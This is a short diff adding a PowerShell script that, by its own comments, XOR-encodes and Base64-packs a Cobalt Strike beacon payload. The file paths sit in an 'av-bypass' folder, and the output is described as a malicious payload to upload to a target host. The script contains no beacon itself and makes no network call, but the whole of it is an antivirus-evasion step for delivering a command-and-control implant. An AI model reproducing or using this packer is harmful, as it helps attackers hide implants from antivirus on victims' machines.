@@ -1,0 +1,12 @@
+#This script encodes a ps1 payload with a specified xor value and saves it to a specified location.
+
+#####Part 1
+#Loads file from path
+$BinaryPath = "C:\Users\huifeng1\Desktop\cobalt\av-bypass\beacon.ps1"
+$file = [IO.File]::ReadAllBytes($BinaryPath)
+#Xor this file with 82 (pick a random number here)
+$encodedFile = $file | ForEach-Object { return $_ -bxor 82}
+#This is the packed malicious payload in string form
+$base64Code = [Convert]::ToBase64String($encodedFile)
+#Write it out to a file to be uploaded to the host
+[IO.File]::WriteAllText("C:\Users\huifeng1\Desktop\cobalt\av-bypass\encode.txt", $base64Code)
